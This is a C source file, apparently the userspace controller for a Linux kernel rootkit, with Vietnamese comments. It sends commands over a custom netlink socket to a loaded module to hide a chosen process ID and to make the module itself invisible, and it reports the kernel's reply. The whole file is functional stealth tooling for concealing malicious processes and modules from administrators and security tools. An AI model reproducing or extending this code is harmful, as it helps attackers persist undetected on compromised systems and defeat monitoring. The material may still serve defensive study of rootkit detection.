#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define NETLINK_DIAMOND  31

#define CMD_HIDE_PID     0x01
#define CMD_MODULE_INVIS 0x02

#define RESP_OK          0x00
#define RESP_ERR         0xFF

struct nl_cmd {
    uint8_t cmd;
    pid_t   pid;
} __attribute__((packed));

// Gui goi tin netlink xuong kernel va cho phan hoi
static int
send_cmd(int sock_fd, uint8_t cmd, pid_t target_pid)
{
    size_t payload_len = sizeof(struct nl_cmd);
    size_t msg_space   = NLMSG_SPACE(payload_len);

    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(msg_space);
    if (!nlh)
        return -1;
    memset(nlh, 0, msg_space);

    nlh->nlmsg_len   = NLMSG_LENGTH(payload_len);
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_type  = NLMSG_MIN_TYPE;

    struct nl_cmd *c = (struct nl_cmd *)NLMSG_DATA(nlh);
    c->cmd = cmd;
    c->pid = target_pid;

    // Dia chi kernel (nl_pid = 0)
    struct sockaddr_nl dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid    = 0;

    struct iovec iov = {
        .iov_base = (void *)nlh,
        .iov_len  = nlh->nlmsg_len,
    };
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name    = (void *)&dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov     = &iov;
    msg.msg_iovlen  = 1;

    if (sendmsg(sock_fd, &msg, 0) < 0) {
        free(nlh);
        return -1;
    }
    free(nlh);

    // Doc phan hoi tu kernel
    char resp_buf[NLMSG_SPACE(sizeof(uint8_t))];
    memset(resp_buf, 0, sizeof(resp_buf));

    struct iovec iov_resp = {
        .iov_base = resp_buf,
        .iov_len  = sizeof(resp_buf),
    };
    struct msghdr msg_resp;
    memset(&msg_resp, 0, sizeof(msg_resp));
    msg_resp.msg_iov    = &iov_resp;
    msg_resp.msg_iovlen = 1;

    ssize_t rcvd = recvmsg(sock_fd, &msg_resp, 0);
    if (rcvd < 0)
        return -1;

    struct nlmsghdr *resp_nlh = (struct nlmsghdr *)resp_buf;
    if (!NLMSG_OK(resp_nlh, (unsigned int)rcvd))
        return -1;

    uint8_t status = *(uint8_t *)NLMSG_DATA(resp_nlh);
    return (status == RESP_OK) ? 0 : -1;
}

static void
print_usage(const char *prog)
{
    fprintf(stderr,
            "Usage:\n"
            "  %s hide <PID>   - An/hien tien trinh\n"
            "  %s modinvis     - An/hien kernel module\n",
            prog, prog);
}

int
main(int argc, char *argv[])
{
    if (argc < 2) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *subcmd = argv[1];
    long pid_val = 0;
    uint8_t cmd = 0;

    // Kiem tra tham so dau vao
    if (strcmp(subcmd, "hide") == 0) {
        if (argc < 3) {
            fprintf(stderr, "[-] Thieu PID\n");
            print_usage(argv[0]);
            return EXIT_FAILURE;
        }

        char *endptr;
        pid_val = strtol(argv[2], &endptr, 10);
        if (*endptr != '\0' || pid_val <= 0 || pid_val > 4194304) {
            fprintf(stderr, "[-] PID khong hop le: %s\n", argv[2]);
            return EXIT_FAILURE;
        }
        cmd = CMD_HIDE_PID;
    } else if (strcmp(subcmd, "modinvis") == 0) {
        cmd = CMD_MODULE_INVIS;
    } else {
        fprintf(stderr, "[-] Lenh khong hop le: %s\n", subcmd);
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    // Khoi tao netlink socket
    int sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_DIAMOND);
    if (sock_fd < 0) {
        fprintf(stderr, "[-] Khong mo duoc socket (module chua duoc nap)\n");
        return EXIT_FAILURE;
    }

    // Gan PID tien trinh lam dia chi nguon
    struct sockaddr_nl src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid    = getpid();

    if (bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        fprintf(stderr, "[-] Bind socket that bai\n");
        close(sock_fd);
        return EXIT_FAILURE;
    }

    // Gui lenh xuong kernel
    int ret = EXIT_SUCCESS;
    if (cmd == CMD_HIDE_PID) {
        if (send_cmd(sock_fd, cmd, (pid_t)pid_val) < 0) {
            fprintf(stderr, "[-] PID %ld: that bai\n", pid_val);
            ret = EXIT_FAILURE;
        } else {
            printf("[+] PID %ld: thanh cong\n", pid_val);
        }
    } else if (cmd == CMD_MODULE_INVIS) {
        if (send_cmd(sock_fd, cmd, 0) < 0) {
            fprintf(stderr, "[-] Module: that bai\n");
            ret = EXIT_FAILURE;
        } else {
            printf("[+] Module: thanh cong\n");
        }
    }

    close(sock_fd);
    return ret;
}